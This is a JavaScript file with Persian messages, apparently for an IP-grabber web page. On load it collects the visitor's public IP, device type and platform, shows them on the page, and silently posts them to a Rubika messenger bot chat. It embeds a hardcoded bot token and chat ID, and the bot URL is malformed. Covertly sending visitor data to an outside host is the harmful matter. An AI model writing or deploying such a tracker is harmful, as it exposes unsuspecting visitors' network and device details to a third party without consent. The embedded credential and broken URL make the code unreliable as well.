const RUBIKA_BOT_TOKEN = 'CDEEFE0SQCVGUEIUMYTWOHPAYYINFJALXYCQFKDJEVTGWUMPIUHUEHGZARGOUAKT'; 
const RUBIKA_CHAT_ID = 'u0IsnAv00253f85906c8a68b68869bd3';



function getDeviceDetails() {
    const ua = navigator.userAgent;
    let deviceType = "رایانه (Desktop)";
    
    if (/Mobi|Android|iPhone|iPad/i.test(ua)) {
        deviceType = "موبایل یا تبلت (Mobile/Tablet)";
    }
    
    return {
        device: deviceType,
        platform: navigator.platform
    };
}

async function sendToRubika(ip, device, platform) {
    const message = `🔔 اطلاعات کاربر جدید 🔔\n\n🌐 آی‌پـی: ${ip}\n💻 دستگاه: ${device}\n⚙️ سیستم عامل: ${platform}`;

    const rubikaUrl = 'https://rubika.ir' + RUBIKA_BOT_TOKEN + '/sendText';
    

    const payload = {
        "chat_id": RUBIKA_CHAT_ID,
        "text": message
    };

    try {
        const response = await fetch(rubikaUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("✅ اطلاعات با موفقیت روی گیت‌هاب پردازش و به روبیکا ارسال شد.");
        } else {
            console.error("❌ خطای پاسخ شبکه");
        }
    } catch (error) {
        console.error("❌ خطا در اتصال به روبیکا:", error);
    }
}

async function collectUserData() {
    let deviceInfo = { device: "نامشخص", platform: "نامشخص" };
    
    try {
        deviceInfo = getDeviceDetails();
        document.getElementById('device').textContent = deviceInfo.device;
        document.getElementById('platform').textContent = deviceInfo.platform;
    } catch (e) {
        console.error(e);
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error("خطا در دریافت آی‌پی");
        
        const data = await response.json();
        const userIP = data.ip || "نامشخص";

        document.getElementById('ip').textContent = userIP;
        
       
        sendToRubika(userIP, deviceInfo.device, deviceInfo.platform);
        
    } catch (error) {
        console.error(error);
        document.getElementById('ip').textContent = "خطا در دریافت آی‌پی";
    }
}

collectUserData();
